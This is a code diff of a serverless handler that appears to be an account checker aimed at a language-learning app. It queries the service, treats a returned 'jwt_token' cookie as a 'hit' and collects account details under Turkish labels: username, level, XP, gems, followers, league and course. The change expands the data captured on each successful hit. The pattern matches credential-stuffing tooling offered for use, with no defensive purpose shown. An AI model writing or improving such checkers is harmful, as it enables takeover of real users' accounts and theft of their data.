@@ -18,7 +18,7 @@ module.exports = async (req, res) => {
         distinctId,
         identifier: username,
         fields:
-          "username,productId,level,phoneNumber,totalXp,gems,num_followers,renewing,tier,currentCourse",
+          "username,level,totalXp,gems,num_followers,tier,currentCourse",
       },
       {
         timeout: 8000,
@@ -31,19 +31,26 @@ module.exports = async (req, res) => {
       }
     );
 
-    const source = JSON.stringify(response.data);
+    const data = response.data || {};
     const cookies = response.headers["set-cookie"] || [];
     const cookieStr = cookies.join("; ");
 
-    if (source.trim() === "{}") {
+    if (JSON.stringify(data).trim() === "{}") {
       return res.json({ result: "bad", captured: {} });
     }
 
-    if (source.includes('"currentCourse":') && cookieStr.includes("jwt_token")) {
-      return res.json({
-        result: "hit",
-        captured: { İsim: response.data.username || null },
-      });
+    if (data.currentCourse && cookieStr.includes("jwt_token")) {
+      const captured = {
+        Kullanıcı: data.username || null,
+        Seviye: data.level || null,
+        XP: data.totalXp || null,
+        Elmas: data.gems || null,
+        Takipçi: data.num_followers || null,
+        Lig: data.tier || null,
+        Kurs: data.currentCourse || null,
+      };
+
+      return res.json({ result: "hit", captured });
     }
 
     return res.json({ result: "bad", captured: {} });
